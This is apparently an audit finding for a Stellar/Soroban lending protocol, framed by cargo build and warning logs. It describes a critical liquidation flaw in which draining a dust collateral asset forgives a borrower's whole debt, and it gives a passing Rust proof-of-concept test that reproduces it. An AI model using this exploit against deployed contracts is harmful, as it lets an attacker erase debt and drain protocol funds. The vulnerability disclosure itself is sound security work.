workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/liquidation-engine/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/incentives/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/treasury/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/flash-liquidation-helper/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/aquarius-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/soroswap-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
   Compiling k2-shared v0.1.0 (/repo/contracts/shared)
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:67:26
   |
67 |             env.events().publish(
   |                          ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:81:22
   |
81 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:107:22
    |
107 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:129:22
    |
129 |         env.events().publish(
    |                      ^^^^^^^

warning: unused variable: `reported_amount_out`
   --> contracts/shared/src/dex.rs:416:9
    |
416 |     let reported_amount_out: u128 = call_soroswap(
    |         ^^^^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_reported_amount_out`
    |
    = note: `#[warn(unused_variables)]` (part of `#[warn(unused)]`) on by default

warning: `k2-shared` (lib) generated 5 warnings (run `cargo fix --lib -p k2-shared` to apply 1 suggestion)
   Compiling k2_token v0.1.0 (/repo/contracts/token)
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:53:22
   |
53 |         env.events().publish(
   |                      ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:93:14
   |
93 |             .publish((symbol_short!("transfer"), from, to), amount);
   |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:140:14
    |
140 |             .publish((symbol_short!("transfer"), from, to), amount);
    |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:159:22
    |
159 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:193:22
    |
193 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:243:22
    |
243 |         env.events().publish((symbol_short!("mint"), to), amount);
    |                      ^^^^^^^

warning: `k2_token` (lib test) generated 6 warnings
    Finished `test` profile [unoptimized + debuginfo] target(s) in 4.82s
     Running unittests src/lib.rs (target/debug/deps/k2_token-e74658dc392f3ea0)
error: test failed, to rerun pass `-p k2_token --lib`
```

---

# Single-asset cap check wrongfully forgives all remaining debt
**#44846**
- Severity: Critical
- Validity: Unreviewed

## Targets
- KineticRouter::internal_liquidation_call

## Affected Locations
- **KineticRouter.internal_liquidation_call**: When `collateral_amount_to_transfer > user_collateral_balance` for the selected `collateral_asset`, the function treats that single-asset exhaustion as if all user collateral has been exhausted and then clears the remaining debt as bad debt.

## Description

The liquidation flow conflates exhaustion of one chosen collateral asset with exhaustion of the user's entire collateral portfolio. In `internal_liquidation_call`, if `collateral_amount_to_transfer > user_collateral_balance` for the liquidated `collateral_asset`, `collateral_cap_triggered` is set and the code proceeds to burn the user's remaining debt and socialize it as protocol bad debt. That assumption is invalid in a multi-collateral account, because the borrower may still hold substantial balances in other collateral assets. A liquidator can therefore target a dust-sized secondary collateral balance, intentionally trigger the cap condition, and cause the protocol to forgive debt that is still fully backed by other assets. The user can then keep or later withdraw their primary collateral while their debt has already been erased from the system.

## Root Cause

`collateral_cap_triggered` is derived only from the balance of the selected `collateral_asset`, but the function incorrectly uses it as a global signal that all collateral is exhausted and the user's remaining debt should be forgiven.

## Impact

An attacker can shed a large borrowed position by liquidating only a dust collateral asset, leaving the protocol to absorb the rest as deficit. This creates a direct loss of protocol value because the forgiven debt is not actually unrecoverable and the user's other collateral remains intact and withdrawable.

## Proof of Concept

### Test Case

```
#![cfg(test)]

use k2_a_token::{ATokenContract, ATokenContractClient};
use k2_debt_token::{DebtTokenContract, DebtTokenContractClient};
use k2_incentives::{IncentivesContract, IncentivesContractClient};
use k2_interest_rate_strategy::{InterestRateStrategyContract, InterestRateStrategyContractClient};
use k2_kinetic_router::{KineticRouterContract, KineticRouterContractClient};
use k2_pool_configurator::{PoolConfiguratorContract, PoolConfiguratorContractClient};
use k2_price_oracle::{PriceOracleContract, PriceOracleContractClient};
use k2_shared::{Asset, InitReserveParams};
use k2_treasury::{TreasuryContract, TreasuryContractClient};
use soroban_sdk::{
    contract, contractimpl,
    testutils::{Address as _, Ledger, LedgerInfo},
    token, Address, Env, String,
};

const ORACLE_ONE_USD: u128 = 1_000_000_000_000_000;
const SEQ_EXPIRY: u32 = 200_000;

#[contract]
pub struct MockReflector;

#[contractimpl]
impl MockReflector {
    pub fn decimals(_env: Env) -> u32 {
        14
    }
}

fn set_default_ledger(env: &Env) {
    env.ledger().set(LedgerInfo {
        sequence_number: 100,
        protocol_version: 23,
        timestamp: 1_700_000_000,
        network_id: Default::default(),
        base_reserve: 10,
        min_temp_entry_ttl: 10,
        min_persistent_entry_ttl: 10,
        max_entry_ttl: 3_110_400,
    });
}

pub struct Harness<'a> {
    pub env: &'a Env,
    pub admin: Address,
    pub emergency_admin: Address,
    pub liquidity_provider: Address,
    pub user: Address,
    pub router: KineticRouterContractClient<'a>,
    pub router_id: Address,
    pub oracle: PriceOracleContractClient<'a>,
    pub pool_configurator: PoolConfiguratorContractClient<'a>,
    pub treasury: TreasuryContractClient<'a>,
    pub incentives: IncentivesContractClient<'a>,
    pub underlying: Address,
    pub underlying_token: token::Client<'a>,
    pub a_token: ATokenContractClient<'a>,
    pub debt_token: DebtTokenContractClient<'a>,
}

impl<'a> Harness<'a> {
    pub fn new(env: &'a Env) -> Self {
        env.mock_all_auths();
        set_default_ledger(env);

        let admin = Address::generate(env);
        let emergency_admin = Address::generate(env);
        let liquidity_provider = Address::generate(env);
        let user = Address::generate(env);

        let reflector_id = env.register(MockReflector, ());
        let oracle_id = env.register(PriceOracleContract, ());
        let oracle = PriceOracleContractClient::new(env, &oracle_id);
        oracle.initialize(
            &admin,
            &reflector_id,
            &Address::generate(env),
            &Address::generate(env),
        );

        let treasury_id = env.register(TreasuryContract, ());
        let treasury = TreasuryContractClient::new(env, &treasury_id);
        treasury.initialize(&admin);

        let router_id = env.register(KineticRouterContract, ());
        let router = KineticRouterContractClient::new(env, &router_id);
        router.initialize(
            &admin,
            &emergency_admin,
            &oracle_id,
            &treasury_id,
            &Address::generate(env),
            &None,
        );

        let incentives_id = env.register(IncentivesContract, ());
        let incentives = IncentivesContractClient::new(env, &incentives_id);
        incentives.initialize(&admin, &router_id);

        let pool_configurator_id = env.register(PoolConfiguratorContract, ());
        let pool_configurator = PoolConfiguratorContractClient::new(env, &pool_configurator_id);
        pool_configurator.initialize(&admin, &router_id, &oracle_id);
        router.set_pool_configurator(&pool_configurator_id);

        let underlying_sac = env.register_stellar_asset_contract_v2(admin.clone());
        let underlying = underlying_sac.address();
        let underlying_token = token::Client::new(env, &underlying);
        let underlying_admin = token::StellarAssetClient::new(env, &underlying);

        underlying_admin.mint(&liquidity_provider, &100_000_000_000_000i128);
        underlying_admin.mint(&user, &100_000_000_000_000i128);

        underlying_token.approve(&liquidity_provider, &router_id, &i128::MAX, &SEQ_EXPIRY);
        underlying_token.approve(&user, &router_id, &i128::MAX, &SEQ_EXPIRY);

        let a_token_id = env.register(ATokenContract, ());
        let a_token = ATokenContractClient::new(env, &a_token_id);
        a_token.initialize(
            &admin,
            &underlying,
            &router_id,
            &String::from_str(env, "Harness aToken"),
            &String::from_str(env, "haTST"),
            &7u32,
        );

        let debt_token_id = env.register(DebtTokenContract, ());
        let debt_token = DebtTokenContractClient::new(env, &debt_token_id);
        debt_token.initialize(
            &admin,
            &underlying,
            &router_id,
            &String::from_str(env, "Harness Debt"),
            &String::from_str(env, "hdTST"),
            &7u32,
        );

        let strategy_id = env.register(InterestRateStrategyContract, ());
        let strategy = InterestRateStrategyContractClient::new(env, &strategy_id);
        strategy.initialize(
            &admin,
            &20_000_000_000_000_000_000_000_000u128,
            &40_000_000_000_000_000_000_000_000u128,
            &600_000_000_000_000_000_000_000_000u128,
            &800_000_000_000_000_000_000_000_000u128,
        );

        let asset = Asset::Stellar(underlying.clone());
        oracle.add_asset(&admin, &asset);
        oracle.set_manual_override(
            &admin,
            &asset,
            &Some(ORACLE_ONE_USD),
            &Some(env.ledger().timestamp() + 604_800),
        );

        let reserve_params = InitReserveParams {
            decimals: 7,
            ltv: 8000,
            liquidation_threshold: 8500,
            liquidation_bonus: 500,
            reserve_factor: 1000,
            supply_cap: 1_000_000_000_000_000,
            borrow_cap: 500_000_000_000_000,
            borrowing_enabled: true,
            flashloan_enabled: true,
        };

        router.init_reserve(
            &pool_configurator_id,
            &underlying,
            &a_token_id,
            &debt_token_id,
            &strategy_id,
            &treasury_id,
            &reserve_params,
        );

        Self {
            env,
            admin,
            emergency_admin,
            liquidity_provider,
            user,
            router,
            router_id,
            oracle,
            pool_configurator,
            treasury,
            incentives,
            underlying,
            underlying_token,
            a_token,
            debt_token,
        }
    }
}

#[test]
fn test_poc_dust_collateral_liquidation_socializes_fully_backed_debt() {
    let env = Env::default();
    env.mock_all_auths();
    env.budget().reset_unlimited();
    set_default_ledger(&env);

    let admin = Address::generate(&env);
    let emergency_admin = Address::generate(&env);
    let liquidity_provider = Address::generate(&env);
    let user = Address::generate(&env);
    let liquidator = Address::generate(&env);

    let reflector_id = env.register(MockReflector, ());
    let oracle_id = env.register(PriceOracleContract, ());
    let oracle = PriceOracleContractClient::new(&env, &oracle_id);
    oracle.initialize(
        &admin,
        &reflector_id,
        &Address::generate(&env),
        &Address::generate(&env),
    );

    let treasury_id = Address::generate(&env);
    let router_id = env.register(KineticRouterContract, ());
    let router = KineticRouterContractClient::new(&env, &router_id);
    router.initialize(
        &admin,
        &emergency_admin,
        &oracle_id,
        &treasury_id,
        &Address::generate(&env),
        &None,
    );

    let pool_configurator_id = Address::generate(&env);
    router.set_pool_configurator(&pool_configurator_id);

    let deploy_reserve = |name: &str| -> Address {
        let underlying_sac = env.register_stellar_asset_contract_v2(admin.clone());
        let underlying = underlying_sac.address();

        let a_token_id = env.register(ATokenContract, ());
        let a_token = ATokenContractClient::new(&env, &a_token_id);
        a_token.initialize(
            &admin,
            &underlying,
            &router_id,
            &String::from_str(&env, name),
            &String::from_str(&env, name),
            &7u32,
        );

        let debt_token_id = env.register(DebtTokenContract, ());
        let debt_token = DebtTokenContractClient::new(&env, &debt_token_id);
        debt_token.initialize(
            &admin,
            &underlying,
            &router_id,
            &String::from_str(&env, name),
            &String::from_str(&env, name),
            &7u32,
        );

        let strategy_id = env.register(InterestRateStrategyContract, ());
        let strategy = InterestRateStrategyContractClient::new(&env, &strategy_id);
        strategy.initialize(
            &admin,
            &20_000_000_000_000_000_000_000_000u128,
            &40_000_000_000_000_000_000_000_000u128,
            &600_000_000_000_000_000_000_000_000u128,
            &800_000_000_000_000_000_000_000_000u128,
        );

        let asset = Asset::Stellar(underlying.clone());
        oracle.add_asset(&admin, &asset);
        oracle.set_manual_override(
            &admin,
            &asset,
            &Some(ORACLE_ONE_USD),
            &Some(env.ledger().timestamp() + 604_800),
        );

        let reserve_params = InitReserveParams {
            decimals: 7,
            ltv: 8000,
            liquidation_threshold: 8500,
            liquidation_bonus: 500,
            reserve_factor: 1000,
            supply_cap: 0,
            borrow_cap: 0,
            borrowing_enabled: true,
            flashloan_enabled: true,
        };

        router.init_reserve(
            &pool_configurator_id,
            &underlying,
            &a_token_id,
            &debt_token_id,
            &strategy_id,
            &treasury_id,
            &reserve_params,
        );

        underlying
    };

    let primary_collateral_asset = deploy_reserve("Primary");
    let dust_collateral_asset = deploy_reserve("Dust");
    let debt_asset = deploy_reserve("Debt");

    let primary_token = token::Client::new(&env, &primary_collateral_asset);
    let dust_token = token::Client::new(&env, &dust_collateral_asset);
    let debt_token = token::Client::new(&env, &debt_asset);

    let primary_admin = token::StellarAssetClient::new(&env, &primary_collateral_asset);
    let dust_admin = token::StellarAssetClient::new(&env, &dust_collateral_asset);
    let debt_admin = token::StellarAssetClient::new(&env, &debt_asset);

    let expiry = env.ledger().sequence() + SEQ_EXPIRY;
    let approve_max = |token: &token::Client<'_>, owner: &Address| {
        token.approve(owner, &router_id, &i128::MAX, &expiry);
    };

    let primary_collateral = 1_000_0000000u128;
    let dust_collateral = 1_0000000u128;
    let borrowed_amount = 800_0000000u128;
    let requested_liquidation = 400_0000000u128;
    let pool_liquidity = 8_000_0000000u128;

    primary_admin.mint(&user, &(primary_collateral as i128));
    dust_admin.mint(&user, &(dust_collateral as i128));
    debt_admin.mint(&liquidity_provider, &(pool_liquidity as i128));
    debt_admin.mint(&liquidator, &(requested_liquidation as i128));

    approve_max(&primary_token, &user);
    approve_max(&dust_token, &user);
    approve_max(&debt_token, &liquidity_provider);
    approve_max(&debt_token, &liquidator);

    router.supply(
        &liquidity_provider,
        &debt_asset,
        &pool_liquidity,
        &liquidity_provider,
        &0u32,
    );

    router.supply(
        &user,
        &primary_collateral_asset,
        &primary_collateral,
        &user,
        &0u32,
    );
    router.set_user_use_reserve_as_coll(&user, &primary_collateral_asset, &true);

    router.supply(
        &user,
        &dust_collateral_asset,
        &dust_collateral,
        &user,
        &0u32,
    );
    router.set_user_use_reserve_as_coll(&user, &dust_collateral_asset, &true);

    router.borrow(&user, &debt_asset, &borrowed_amount, &1u32, &0u32, &user);

    let primary_oracle_asset = Asset::Stellar(primary_collateral_asset.clone());
    oracle.reset_circuit_breaker(&admin, &primary_oracle_asset);
    oracle.set_manual_override(
        &admin,
        &primary_oracle_asset,
        &Some(940_000_000_000_000u128),
        &Some(env.ledger().timestamp() + 604_800),
    );

    let pre_liquidation = router.get_user_account_data(&user);
    assert!(pre_liquidation.health_factor < 1_000_000_000_000_000_000u128);
    assert!(pre_liquidation.health_factor > 500_000_000_000_000_000u128);

    let liquidator_balance_before = debt_token.balance(&liquidator);
    router.liquidation_call(
        &liquidator,
        &dust_collateral_asset,
        &debt_asset,
        &user,
        &requested_liquidation,
        &false,
    );
    let liquidator_balance_after = debt_token.balance(&liquidator);
    let liquidator_spent = liquidator_balance_before - liquidator_balance_after;

    assert!(
        liquidator_spent < 2_0000000,
        "dust collateral cap should reduce the actual repayment to less than 2 tokens, spent={liquidator_spent}"
    );

    let post_liquidation = router.get_user_account_data(&user);
    assert_eq!(
        post_liquidation.total_debt_base, 0,
        "selected dust collateral should not erase the entire debt while other collateral remains"
    );
    assert!(
        post_liquidation.total_collateral_base > 0,
        "primary collateral remains after the dust collateral liquidation"
    );

    let deficit = router.get_reserve_deficit(&debt_asset);
    assert!(
        deficit > 790_0000000,
        "most of the debt was written off as protocol deficit instead of being left against the primary collateral: {deficit}"
    );

    assert_eq!(primary_token.balance(&user), 0);
    let withdrawn = router.withdraw(
        &user,
        &primary_collateral_asset,
        &u128::MAX,
        &user,
    );
    assert_eq!(withdrawn, primary_collateral);
    assert_eq!(primary_token.balance(&user), primary_collateral as i128);
}

#[test]
fn test_runtime_lending_flow_harness() {
    let env = Env::default();
    let harness = Harness::new(&env);

    let pool_liquidity = 50_000_000_000u128;
    let collateral = 20_000_000_000u128;
    let borrow_amount = 5_000_000_000u128;

    harness.router.supply(
        &harness.liquidity_provider,
        &harness.underlying,
        &pool_liquidity,
        &harness.liquidity_provider,
        &0u32,
    );

    harness.router.supply(
        &harness.user,
        &harness.underlying,
        &collateral,
        &harness.user,
        &0u32,
    );
    harness
        .router
        .set_user_use_reserve_as_coll(&harness.user, &harness.underlying, &true);

    let balance_before_borrow = harness.underlying_token.balance(&harness.user);
    harness.router.borrow(
        &harness.user,
        &harness.underlying,
        &borrow_amount,
        &1u32,
        &0u32,
        &harness.user,
    );
    let balance_after_borrow = harness.underlying_token.balance(&harness.user);
    assert_eq!(
        balance_after_borrow,
        balance_before_borrow + borrow_amount as i128,
        "borrow should transfer underlying to the user",
    );

    let account = harness.router.get_user_account_data(&harness.user);
    assert!(account.total_collateral_base > 0, "collateral should be tracked");
    assert!(account.total_debt_base > 0, "debt should be tracked");

    harness.router.repay(
        &harness.user,
        &harness.underlying,
        &u128::MAX,
        &1u32,
        &harness.user,
    );
    assert_eq!(harness.debt_token.balance(&harness.user), 0);

    harness.router.withdraw(
        &harness.user,
        &harness.underlying,
        &u128::MAX,
        &harness.user,
    );
    assert_eq!(harness.a_token.balance(&harness.user), 0);

    let final_account = harness.router.get_user_account_data(&harness.user);
    assert_eq!(final_account.total_debt_base, 0);
    assert_eq!(final_account.total_collateral_base, 0);
}
```

### Setup Script

```
#!/bin/bash
set -e

# install dependencies
rustup default stable
```

### Output

```
running 1 test
test test_poc_dust_collateral_liquidation_socializes_fully_backed_debt ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 1 filtered out; finished in 0.68s

warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/kinetic-router/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/a-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/debt-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/interest-rate-strategy/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/price-oracle/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/pool-configurator/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/liquidation-engine/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/incentives/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/treasury/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/flash-liquidation-helper/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/aquarius-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/soroswap-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:67:26
   |
67 |             env.events().publish(
   |                          ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:81:22
   |
81 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:107:22
    |
107 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:129:22
    |
129 |         env.events().publish(
    |                      ^^^^^^^

warning: unused variable: `reported_amount_out`
   --> contracts/shared/src/dex.rs:416:9
    |
416 |     let reported_amount_out: u128 = call_soroswap(
    |         ^^^^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_reported_amount_out`
    |
    = note: `#[warn(unused_variables)]` (part of `#[warn(unused)]`) on by default

warning: `k2-shared` (lib) generated 5 warnings (run `cargo fix --lib -p k2-shared` to apply 1 suggestion)
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/pool-configurator/src/contract.rs:68:22
   |
68 |         env.events().publish(
   |                      ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/pool-configurator/src/contract.rs:92:22
   |
92 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/contract.rs:282:22
    |
282 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/contract.rs:309:22
    |
309 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/contract.rs:471:26
    |
471 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/contract.rs:484:22
    |
484 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/contract.rs:518:22
    |
518 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/contract.rs:547:22
    |
547 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/pool-configurator/src/oracle.rs:59:18
   |
59 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/pool-configurator/src/reserve.rs:36:22
   |
36 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/pool-configurator/src/reserve.rs:47:22
   |
47 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/pool-configurator/src/reserve.rs:98:18
   |
98 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:149:22
    |
149 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:160:22
    |
160 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:276:18
    |
276 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:322:18
    |
322 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:373:18
    |
373 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:429:18
    |
429 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:462:18
    |
462 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:502:18
    |
502 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:538:18
    |
538 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:575:10
    |
575 |         .publish((symbol_short!("debt_ceil"), asset.clone()), debt_ceiling);
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:619:18
    |
619 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:651:18
    |
651 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:683:18
    |
683 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/pool-configurator/src/reserve.rs:813:18
    |
813 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/treasury/src/events.rs:32:18
   |
32 |     env.events().publish(
   |                  ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/treasury/src/events.rs:43:18
   |
43 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/treasury/src/events.rs:54:18
   |
54 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/debt-token/src/contract.rs:194:22
    |
194 |         env.events().publish(
    |                      ^^^^^^^
    |
    = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/debt-token/src/contract.rs:263:22
    |
263 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/debt-token/src/contract.rs:361:26
    |
361 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/price-oracle/src/contract.rs:79:22
   |
79 |         env.events().publish(
   |                      ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/price-oracle/src/contract.rs:96:22
   |
96 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:162:22
    |
162 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:185:22
    |
185 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:201:22
    |
201 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:237:22
    |
237 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:272:22
    |
272 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:342:30
    |
342 |                 env.events().publish(
    |                              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:350:34
    |
